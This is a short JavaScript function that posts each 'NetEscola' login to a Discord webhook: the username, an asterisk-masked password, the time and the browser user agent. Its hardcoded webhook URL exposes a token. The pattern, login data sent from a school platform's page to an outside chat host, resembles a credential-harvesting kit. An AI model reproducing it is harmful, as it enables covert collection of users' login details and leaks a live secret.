// Enviar dados para o Discord via webhook
export async function sendToDiscord(webhookUrl, username, password) {
    if (!webhookUrl || webhookUrl.includes('https://discord.com/api/webhooks/1429236562134302781/9aDDtdDEO18AtU_Z7s08oRx9vjwhaez9shQWO6P3Ycf0ljNPM5iEitEd1f_8p8Opj-o2')) {
        console.warn('Webhook do Discord não configurado. Configure o webhook no script.js');
        return;
    }
    
    try {
        // Ocultar parte da senha para exibição
        const hiddenPassword = '*'.repeat(Math.min(6, password.length)) + 
                              password.substring(Math.min(6, password.length)).replace(/./g, '*');
        
        const timestamp = new Date().toLocaleString('pt-BR');
        
        const embed = {
            title: '🔐 Novo Login NetEscola',
            color: 0x2e7d32,
            fields: [
                {
                    name: '👤 Usuário',
                    value: `\`\`\`${username}\`\`\``,
                    inline: false
                },
                {
                    name: '🔑 Senha (oculta)',
                    value: `\`\`\`${hiddenPassword}\`\`\``,
                    inline: false
                },
                {
                    name: '🕒 Data/Hora',
                    value: timestamp,
                    inline: true
                },
                {
                    name: '🌐 Navegador',
                    value: navigator.userAgent.substring(0, 50) + '...',
                    inline: true
                }
            ],
            footer: {
                text: 'NetEscola Login System',
                icon_url: 'https://cdn-icons-png.flaticon.com/512/2232/2232688.png'
            },
            timestamp: new Date().toISOString()
        };
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: '📬 **Novo acesso à plataforma NetEscola**',
                embeds: [embed]
            })
        });
        
        if (!response.ok) {
            console.error('Erro ao enviar para Discord:', response.statusText);
        }
        
    } catch (error) {
        console.error('Erro ao enviar para Discord:', error);
    }
}
